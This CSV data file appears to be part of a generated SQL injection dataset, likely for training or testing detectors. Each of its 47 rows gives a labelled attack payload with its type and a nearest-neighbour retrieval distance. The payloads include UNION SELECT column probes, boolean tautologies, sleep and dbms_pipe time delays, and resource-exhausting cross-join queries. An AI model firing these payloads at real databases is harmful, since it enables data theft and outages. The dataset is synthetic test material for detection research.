id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000154,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004632,6.254073889449422
GAN_000155,attack,boolean,"1""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008487,7.6658546212456
GAN_000156,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,4.791491671857076
GAN_000157,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R006724,11.95523935179852
GAN_000158,attack,boolean,"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R005184,6.449649305261902
GAN_000159,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.9942483984042925
GAN_000160,attack,union,"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",nearest_attack_euclidean,R007121,8.43901362114509
GAN_000161,attack,boolean,-9556 or   (  2049  =  6967  )  *6967# mhbc,nearest_attack_euclidean,R002502,6.292092945720003
GAN_000162,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,8.264551096963041
GAN_000163,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.7090123015239795
GAN_000164,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006694,5.744619436307213
GAN_000165,attack,boolean,"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003671,7.1848973554865685
GAN_000166,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R006611,5.158045091635424
GAN_000167,attack,union,"1   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001735,5.472865297665635
GAN_000168,attack,boolean,"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",nearest_attack_euclidean,R008712,4.710410934860514
GAN_000169,attack,union,"1 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000905,7.681653554120648
GAN_000170,attack,boolean,-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R008049,7.287521219031539
GAN_000171,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R002362,4.209663142805774
GAN_000172,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003358,6.879322823582537
GAN_000173,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,6.751434498103311
GAN_000174,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,8.10530349718674
GAN_000175,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",nearest_attack_euclidean,R003361,6.807795073193681
GAN_000176,attack,boolean,"1%'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006135,6.8646359774871675
GAN_000177,attack,union,"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",nearest_attack_euclidean,R007121,6.464218366307168
GAN_000178,attack,union,"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",nearest_attack_euclidean,R007121,9.283269454296406
GAN_000179,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R005630,5.826691789111618
GAN_000180,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",nearest_attack_euclidean,R001217,7.890268016856452
GAN_000181,attack,boolean,-9389'  )   or 8859  =  3989--,nearest_attack_euclidean,R005856,9.099154711327987
GAN_000182,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000972,9.57210302563337
GAN_000183,attack,union,"1'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R005024,5.474274886700846
GAN_000184,attack,time,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R005371,8.772615313185522
GAN_000185,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R006353,7.123494059461095
GAN_000186,attack,boolean,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",nearest_attack_euclidean,R005584,7.864361080214538
GAN_000187,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R008080,7.551057588406015
GAN_000188,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R007154,5.260938472630986
GAN_000189,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R008526,7.304440229106201
GAN_000190,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R007095,6.952330960842019
GAN_000191,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R001976,8.491302412678301
GAN_000192,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R006054,4.352345965916499
GAN_000193,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R005801,9.508982144627408
GAN_000194,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,7.2802180764026065
GAN_000195,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,10.754082468533605
GAN_000196,attack,boolean,"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R006322,4.957881993303086
GAN_000197,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R005037,7.1323217264302246
GAN_000198,attack,boolean,"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",nearest_attack_euclidean,R005077,7.971309485700468
GAN_000199,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R004003,4.974699318873331
GAN_000200,attack,boolean,-7941 or   (  5822  =  8754  )  *8754-- eepn,nearest_attack_euclidean,R001200,8.63293891227163
